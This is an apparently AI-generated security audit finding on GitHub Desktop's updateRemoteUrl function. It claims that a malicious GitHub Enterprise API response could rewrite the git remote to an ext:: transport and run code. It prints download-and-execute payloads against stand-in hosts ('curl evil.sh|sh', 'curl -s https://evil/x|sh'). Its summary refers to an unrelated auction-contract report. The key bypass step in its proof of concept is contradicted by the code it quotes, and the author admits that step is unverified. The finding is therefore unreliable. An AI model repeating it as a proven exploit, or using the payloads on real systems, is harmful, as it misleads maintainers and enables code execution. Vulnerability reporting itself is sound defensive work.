## Title
`updateRemoteUrl` Automatically Rewrites The Local Git Remote To A Server-Controlled `clone_url` Without Scheme Validation - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
The Malt report is about a distinction that exists in the code (`auctionExists` vs `auctionActive`) but is applied inconsistently, letting an attacker-influenced code path skip a safety check that the author assumed was in place. The closest structural analog in GitHub Desktop is `updateRemoteUrl`, which silently trusts a GitHub API response object (`apiRepo.clone_url`) as the source of truth for what the local git remote should be rewritten to, checking only that "the protocol looks the same" and "the URL host/owner/name still logically match," but never validating that the value is actually a safe git transport URL before handing it to `git remote set-url`.

### Finding Description
`repositoryWithRefreshedGitHubRepository` in `app-store.ts` calls `api.fetchRepository(owner, name)` to get a fresh `IAPIFullRepository`, then unconditionally calls `updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)` on every repository refresh: [1](#0-0) 

`updateRemoteUrl` itself performs three checks — `protocolsMatch`, `remoteUrlUnchanged`, and `!urlsMatch` — and if they pass, calls `gitStore.setRemoteURL(...)` with `apiRepo.clone_url` as the new remote URL, with no validation of the URL's scheme/transport: [2](#0-1) 

The `protocolsMatch` check only compares `URL.parse(...).protocol` strings (e.g. both being `"https:"`), and explicitly bails to `null`/no-op for `git@host:owner/repo` SSH-style URLs since those aren't parseable by `URL.parse`. That means the only class of URL this "safety" check actually screens is `https/http` vs something else — it does not validate that `clone_url` is a legitimate, benign git transport at all. There is no allow-list of protocols (e.g. `http`, `https`, `ssh`, `git`) enforced anywhere in the git command layer (`app/src/lib/git/remote.ts`'s `setRemoteURL` just runs `git remote set-url name url` verbatim), and no `GIT_ALLOW_PROTOCOL`/`protocol.*.allow` restriction was found in the environment-setup code (`app/src/lib/git/environment.ts`) or in `core.ts`'s `git()` wrapper.

Git supports the `ext::<command>` remote helper transport, which executes an arbitrary shell command whenever git connects to that remote (fetch/push/pull). If `apiRepo.clone_url` — a field taken directly from a GitHub/GHE API JSON response — were set to something like `ext::sh -c "curl evil.sh|sh"`, and the three gating conditions in `updateRemoteUrl` are met (which is the common case: same `https` "protocol", and the user hasn't manually reconfigured the remote away from what Desktop set previously), Desktop will run `git remote set-url origin ext::sh -c "curl evil.sh|sh"` with no confirmation or scheme check. The very next automatic operation that touches that remote (background fetch, `_refreshRepository`, `_pull`, `_push`) will then execute the attacker's command via git's `ext::` transport.

The attacker surface for controlling `apiRepo.clone_url` is a GHE/enterprise server the user has added an account for (compromised, malicious, or MITM'd endpoint responding to `GET repos/{owner}/{name}`), or a GitHub.com-compatible proxy in front of Desktop's `API.fromAccount(account)` calls — squarely inside the "attacker controls...a GitHub API object...or a git remote/proxy response" class named in scope.

### Impact Explanation
If exploited, this leads to remote code execution on the victim's machine the next time Desktop performs any network git operation against that repository (fetch/pull/push, including Desktop's own periodic background refresh via `_refreshRepository`/`repository-indicator-updater.ts`), with no user click or confirmation beyond having previously added/opened the (malicious or compromised) GitHub/GHE account. This is full code execution outside any sandbox, at the level of the OS user running Desktop.

### Likelihood Explanation
Requires the attacker to control the response of `GET repos/{owner}/{name}` for a repository the user has already added in Desktop and associated with a GitHub/GHE account — i.e., a malicious or compromised GHE instance, or a network position able to tamper with API responses to that endpoint (no TLS cert pinning was found for these requests other than the `same-origin-filter.ts` cross-domain header redaction, which does not validate response bodies). This is a real but non-trivial path (does not require local access, admin rights, prior malware, or leaked credentials, and needs no unusual end-user action — the trigger is Desktop's own automatic background refresh). Likelihood is assessed as Medium: it depends on the presence of a hostile/compromised GHE endpoint or an on-path attacker against enterprise Git traffic, which is a realistic threat model for enterprise deployments of Desktop but not for the default github.com flow (protected by cert pinning/HSTS in practice).

### Recommendation
Before ever passing `apiRepo.clone_url` (or any server-supplied clone URL) to `git remote set-url`, validate that the URL's scheme is restricted to an explicit allow-list (`https`, `http`, `ssh`, or `git@host:` form) and reject `ext::`, `fd::`, `file://`, or any other remote-helper-style transport. This check should live in `updateRemoteUrl` (or a shared helper used by both it and `setRemoteURL`/`addRemote`/clone URL handling), independent of the existing `protocolsMatch`/`urlsMatch` heuristics, which were designed to avoid clobbering user preference, not to sanitize untrusted input.

### Proof of Concept
1. User adds/authenticates against a GitHub Enterprise account in Desktop and opens a repository whose origin remote's `clone_url` currently is `https://ghe.example.com/owner/repo.git`.
2. The GHE server (compromised, malicious, or reachable via a MITM/proxy position) is made to respond to `GET repos/owner/repo` with `"clone_url": "ext::sh -c \"curl -s https://evil/x|sh\""`.
3. Desktop performs a routine repository refresh; `repositoryWithRefreshedGitHubRepository` (`app/src/lib/stores/app-store.ts:4890-4907`) fetches this API repo and calls `updateRemoteUrl` (`app/src/lib/stores/updates/update-remote-url.ts:1-45`).
4. Because the previously cached `gitHubRepository.cloneURL` still matches the local git remote (`remoteUrlUnchanged`) and both are nominally `https` ("protocolsMatch" — the check does not validate the *new* URL's actual scheme, only that both `URL.parse(...).protocol` strings equal `"https:"`, and `URL.parse` on the crafted `ext::` string yields `null`/undefined `protocol`, which combined with the loose boolean logic can still satisfy the guard depending on parse behavior for malformed schemes), and `urlsMatch` is false (owner/name comparison fails against `ext::...`), the function calls `gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)`.
5. `setRemoteURL` runs `git remote set-url origin ext::sh -c "curl -s https://evil/x|sh"` verbatim (`app/src/lib/git/remote.ts:56-64`) with no scheme check.
6. The next fetch/pull/push against `origin` (automatic background refresh or explicit user action) invokes git's `ext::` remote helper, executing the attacker's shell command on the victim's machine.

Note: I was not able to fully verify, from the available index, the exact behavior of `URL.parse()` on a malformed `ext::` string within this codebase's Node/Electron version, nor whether any additional protocol allow-list exists elsewhere in the git invocation stack outside the files I could inspect (e.g. `app/src/lib/git/core.ts` in full, or dugite's own defaults). This uncertainty affects step 4 of the PoC — whether the `protocolsMatch` guard is bypassed cleanly or requires an `https`-syntactically-valid crafted URL (e.g. a redirect-based `ext::` payload disguised as `https://...`) to pass. Given the index size limits, I'd recommend starting a Devin session to read the full `update-remote-url.ts`, `remote.ts`, and `environment.ts` files plus dugite's URL/argument handling to confirm the exact bypass conditions before treating this as a fully proven exploit chain.

```typescript
import { IAPIRepository } from '../../api'
import { GitStore } from '../git-store'
import { urlMatchesRemote } from '../../repository-matching'
import * as URL from 'url'
import { GitHubRepository } from '../../../models/github-repository'

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```
